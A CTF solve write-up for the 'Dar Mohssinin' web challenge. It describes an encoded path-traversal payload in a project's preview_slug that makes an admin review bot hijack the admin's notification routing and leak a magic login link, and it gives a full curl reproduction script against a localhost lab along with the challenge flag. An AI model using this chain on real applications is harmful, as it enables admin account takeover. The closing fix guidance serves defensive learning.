# Dar Mohssinin Web CTF - Official Solve Writeup
## **Author:** BlackMy7h

## Challenge Objective
Obtain an admin session, then call:

```http
GET /v1/api/capture
```

Expected flag:

`NSC{14h_yd3w3mh4_n34m4_lfl4g_0lm4_fl0s_lm0hss1n_k4m1n_l1ya}`

---

## Core Vulnerability Chain
This is an intentional logic chain:

1. CSPT-style traversal via encoded `preview_slug`
2. Admin review bot fetches attacker-controlled resolved path with admin cookies
3. Legacy one-click GET endpoint rewrites admin `notify_email`
4. Reviewed project triggers admin operational notification with one-click magic link
5. Attacker receives that admin magic link in their internal mailbox
6. Magic link grants admin session
7. Admin session accesses `/v1/api/capture`

---

## Why This Scenario Is Realistic
The product behavior is plausible:

- `notify_email` is an operational channel (review updates, internal workflow alerts)
- Password recovery is a security flow tied to primary account email
- Internal corporate addresses (`@dar-lmohsinin.ma`) route to in-app mailbox feed
- Legacy one-click links still exist for convenience in older operational emails

Hardening in place:

- Users cannot directly set `notify_email` to admin mailbox values
- So the CSPT + bot step is required for takeover

---

## Recon Clues a Player Sees

- Project cards and detail page mention **Automated Compliance Bot** review activity
- Submitted projects move from `pending` to `reviewed` shortly after submission
- Settings warns that legacy one-click notification links can still update routing
- Internal mailbox behavior is tied to `@dar-lmohsinin.ma`

---

## Step-by-Step Solve

## Step 0 - Register attacker account
Example:

- username: `test`
- password: `DeltaPass123!`

Sign in as this user.

---

## Step 1 - Route attacker notifications to internal inbox
In Settings, set notification email to:

```text
test@dar-lmohsinin.ma
```

Verify bell header shows:

```text
-> test@dar-lmohsinin.ma
```

---

## Step 2 - Craft malicious preview slug
Use encoded traversal payload:

```text
%2e%2e/%2e%2e/account/notifications/unsubscribe?email=test%40dar-lmohsinin.ma
```

After decode + resolution in bot context, this becomes:

```text
/v1/api/account/notifications/unsubscribe?email=test@dar-lmohsinin.ma
```

---

## Step 3 - Submit malicious project
Create a project with that payload as `preview_slug`.
Wait ~2-4 seconds.

What happens:

1. Bot (admin-authenticated) fetches the resolved unsubscribe URL
2. Admin `notify_email` is changed to `test@dar-lmohsinin.ma`
3. Same review completion emits an **admin operational notification**
4. That notification now lands in attacker inbox (because admin routing was hijacked)

---

## Step 4 - Redeem admin magic link
Open notification bell as attacker and find **Compliance Queue Update**.
Click **Open Compliance Queue** (or call the link manually).

That link hits:

```http
GET /v1/api/auth/magic/<token>
```

It is single-use and creates an authenticated session for the token owner (admin).

---

## Step 5 - Capture flag
Now with admin session:

```bash
curl -s 'http://localhost:5000/v1/api/capture' -b admin.txt
```

---

## API Reproduction Script

```bash
BASE='http://localhost:5000/v1/api'
USER='test'
PASS='DeltaPass123!'

# 1) Signup
curl -s -i -c c.txt -X POST "$BASE/auth/signup" \
  -H 'Content-Type: application/json' \
  --data "{\"username\":\"$USER\",\"email\":\"$USER@x.com\",\"password\":\"$PASS\"}"

# 2) Login
curl -s -i -b c.txt -c c.txt -X POST "$BASE/auth/signin" \
  -H 'Content-Type: application/json' \
  --data "{\"username\":\"$USER\",\"password\":\"$PASS\"}"

# 3) CSRF token
CSRF=$(curl -s -b c.txt "$BASE/auth/whoami" | jq -r '.csrf_token')

# 4) Set internal notify mailbox
curl -s -i -b c.txt -X PATCH "$BASE/account/notifications" \
  -H 'Content-Type: application/json' \
  -H "X-CSRF-Token: $CSRF" \
  --data "{\"notify_email\":\"$USER@dar-lmohsinin.ma\"}"

# 5) Submit malicious project
curl -s -i -b c.txt -X POST "$BASE/projects" \
  -H 'Content-Type: application/json' \
  --data "{
    \"name\":\"poc\",
    \"description\":\"bot path test\",
    \"preview_slug\":\"%2e%2e/%2e%2e/account/notifications/unsubscribe?email=$USER%40dar-lmohsinin.ma\"
  }"

# 6) Wait for bot
sleep 4

# 7) Read attacker's internal mailbox and extract admin magic link
curl -s -b c.txt "$BASE/internal/notify/$USER"
# Find payload.type == "admin_ops" and copy payload.link

# 8) Redeem magic link, store new session (admin)
MAGIC_LINK='/v1/api/auth/magic/<TOKEN_FROM_STEP_7>'
curl -s -i -c admin.txt "http://localhost:5000$MAGIC_LINK"

# 9) Capture flag
curl -s -b admin.txt "$BASE/capture"
```

---

## Root Cause Mapping

1. Weak traversal filtering (`../` blocked literally, encoded traversal accepted)
2. Privileged bot resolving attacker-controlled path
3. State-changing legacy GET endpoint for notification routing
4. Sensitive admin operational link delivered to mutable notification channel
5. Magic-link auth flow with strong impact when routing is hijacked

---

## Lessons / Fix Guidance

1. Normalize and validate preview paths before storage and before bot fetch
2. Remove state-changing GET endpoints
3. Do not deliver privileged auth links via mutable user-controlled channels
4. Restrict bots with strict endpoint allowlists and least privilege
5. Keep admin operational workflows behind explicit re-auth / MFA checks

---

## Clarification
This challenge is CSPT + business-logic abuse.
It is **not** SSTI.
